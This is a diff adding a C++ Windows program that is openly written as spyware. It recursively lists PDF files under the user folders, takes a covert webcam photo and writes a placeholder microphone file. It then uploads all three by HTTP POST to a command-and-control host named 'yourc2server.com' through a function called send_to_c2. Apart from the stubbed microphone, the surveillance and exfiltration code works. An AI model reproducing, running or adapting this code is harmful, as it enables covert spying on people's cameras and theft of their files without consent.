@@ -1,0 +1,85 @@
+#include <windows.h>
+#include <wininet.h>
+#include <iostream>
+#include <fstream>
+#include <vector>
+#include <string>
+#include <filesystem>
+#include <thread>
+#include <chrono>
+#include <opencv2/opencv.hpp>
+
+#pragma comment(lib, "wininet.lib")
+
+namespace fs = std::filesystem;
+
+// 🔍 File Hunter: Recursively find .pdf files
+std::vector<std::string> hunt_files(const std::string& root, const std::string& ext) {
+    std::vector<std::string> found;
+    for (auto& p : fs::recursive_directory_iterator(root)) {
+        if (p.path().extension() == ext) {
+            found.push_back(p.path().string());
+        }
+    }
+    std::ofstream log("found_files.txt");
+    for (const auto& f : found) log << f << "\n";
+    return found;
+}
+
+// 📸 Webcam Capture (OpenCV)
+void capture_webcam(const std::string& out_file) {
+    cv::VideoCapture cam(0);
+    if (!cam.isOpened()) return;
+    cv::Mat frame;
+    cam >> frame;
+    cv::imwrite(out_file, frame);
+    cam.release();
+}
+
+// 🎙️ Fake Mic Listener Stub
+void record_mic_stub(const std::string& out_file, int seconds) {
+    std::ofstream fake(out_file);
+    fake << "Simulated microphone audio for " << seconds << " seconds.";
+    fake.close();
+    std::this_thread::sleep_for(std::chrono::seconds(seconds));
+}
+
+// 🌐 Upload via WinINet HTTP POST
+void send_to_c2(const std::string& url, const std::string& file) {
+    std::ifstream f(file, std::ios::binary);
+    if (!f.is_open()) return;
+    std::string data((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
+
+    HINTERNET hInt = InternetOpen("WinAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInt) return;
+
+    HINTERNET hConn = InternetConnect(hInt, "yourc2server.com", INTERNET_DEFAULT_HTTP_PORT,
+                                      NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    if (!hConn) { InternetCloseHandle(hInt); return; }
+
+    HINTERNET hReq = HttpOpenRequest(hConn, "POST", "/upload", NULL, NULL, NULL,
+                                     INTERNET_FLAG_RELOAD, 0);
+    if (!hReq) { InternetCloseHandle(hConn); InternetCloseHandle(hInt); return; }
+
+    HttpSendRequest(hReq, NULL, 0, (LPVOID)data.c_str(), data.length());
+
+    InternetCloseHandle(hReq);
+    InternetCloseHandle(hConn);
+    InternetCloseHandle(hInt);
+}
+
+// 🧠 Main Function
+int main() {
+    std::string webcam_out = "cam.jpg";
+    std::string mic_out = "mic.wav";
+
+    hunt_files("C:\\Users\\", ".pdf");
+    capture_webcam(webcam_out);
+    record_mic_stub(mic_out, 5);
+
+    send_to_c2("http://yourc2server.com/upload", "found_files.txt");
+    send_to_c2("http://yourc2server.com/upload", webcam_out);
+    send_to_c2("http://yourc2server.com/upload", mic_out);
+
+    return 0;
+}
